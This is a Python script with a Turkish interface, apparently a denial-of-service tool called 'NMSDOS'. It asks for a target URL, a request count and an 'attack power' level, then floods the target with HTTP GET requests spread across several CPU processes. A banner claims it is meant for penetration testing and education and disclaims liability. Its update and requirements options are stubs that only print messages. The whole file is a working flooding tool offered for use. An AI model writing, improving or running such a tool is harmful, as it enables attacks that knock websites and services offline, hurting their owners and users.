#!/usr/bin/env python3
import os
import time
import multiprocessing
import sys
import requests

def print_banner():
    banner = r"""
    ███╗   ██╗███╗   ███╗███████╗██████╗  ██████╗ ███████╗
    ████╗  ██║████╗ ████║██╔════╝██╔══██╗██╔═══██╗██╔════╝
    ██╔██╗ ██║██╔████╔██║███████╗██║  ██║██║   ██║███████╗
    ██║╚██╗██║██║╚██╔╝██║╚════██║██║  ██║██║   ██║╚════██║
    ██║ ╚████║██║ ╚═╝ ██║███████║██████╔╝╚██████╔╝███████║
    ╚═╝  ╚═══╝╚═╝     ╚═╝╚══════╝╚═════╝  ╚══════╝ ╚══════╝
                                                    
    (Uygulama penetrasyon testleri ve eğitim amaçlı geliştirilmiştir. HERHANGİ BİR HASARDAN SORUMLU DEĞİLİM!!!)"""
    print(banner)

def main_menu():
    print("1) Saldırıyı Başlat")
    print("2) Uygulamayı Güncelle")
    print("3) Gereksinimleri Kontrol Et")

def send_requests(target, request_count):
    for _ in range(request_count):
        try:
            response = requests.get(target)
            print(f"Status Code: {response.status_code}")
        except requests.exceptions.RequestException as e:
            print(f"Hata: {e}")

def start_attack():
    try:
        target = input("Hedef URL: ")
        request_count = int(input("Gönderilecek İstek Sayısı: "))
        attack_power = int(input("Saldırı Gücü (1-2-3): "))

        if attack_power not in [1, 2, 3]:
            print("Geçersiz saldırı gücü seçimi. Varsayılan olarak 2 seçildi.")
            attack_power = 2

        total_cores = multiprocessing.cpu_count()
        if attack_power == 1:
            cores_to_use = max(1, total_cores // 4)
        elif attack_power == 2:
            cores_to_use = max(1, total_cores // 2)
        else:
            cores_to_use = total_cores

        print(f"{request_count} adet istek {target} adresine {cores_to_use} çekirdek kullanılarak gönderiliyor...")

        requests_per_core = request_count // cores_to_use
        remaining_requests = request_count % cores_to_use

        processes = []
        start_time = time.time()

        for i in range(cores_to_use):
            additional_request = 1 if i < remaining_requests else 0
            process = multiprocessing.Process(target=send_requests, args=(target, requests_per_core + additional_request))
            processes.append(process)
            process.start()

        for process in processes:
            process.join()

        end_time = time.time()
        duration = end_time - start_time

        print(f"Saldırı tamamlandı. Toplam gönderilen istek sayısı: {request_count}. Süre: {duration:.2f} saniye.")
        time.sleep(5)  # Pause for 5 seconds before clearing the screen
    except Exception as e:
        print(f"Hata: {e}")
        input("Devam etmek için bir tuşa basın...")

def update_application():
    try:
        print("Ağ bağlantısı denetleniyor...")
        time.sleep(2)
        print("Güncelleme Bulunmuyor")
        time.sleep(4)  # Pause for 4 seconds before clearing the screen
    except Exception as e:
        print(f"Hata: {e}")
        input("Devam etmek için bir tuşa basın...")

def check_requirements():
    try:
        print("Gereksinimler Otomatik Yüklenmiştir")
        time.sleep(4)  # Pause for 4 seconds before clearing the screen
    except Exception as e:
        print(f"Hata: {e}")
        input("Devam etmek için bir tuşa basın...")

def main():
    try:
        if os.geteuid() != 0:
            print("Bu script root yetkileriyle çalıştırılmalıdır. Lütfen yönetici hakları ile çalıştırın.")
            sys.exit(1)

        while True:
            os.system('clear')
            print_banner()
            main_menu()
            choice = input("Bir seçenek girin: ")

            if choice == '1':
                start_attack()
            elif choice == '2':
                update_application()
            elif choice == '3':
                check_requirements()
            else:
                print("Geçersiz seçenek, lütfen tekrar deneyin.")
                time.sleep(2)
    except Exception as e:
        print(f"Hata: {e}")
        input("Devam etmek için bir tuşa basın...")

if __name__ == "__main__":
    main()

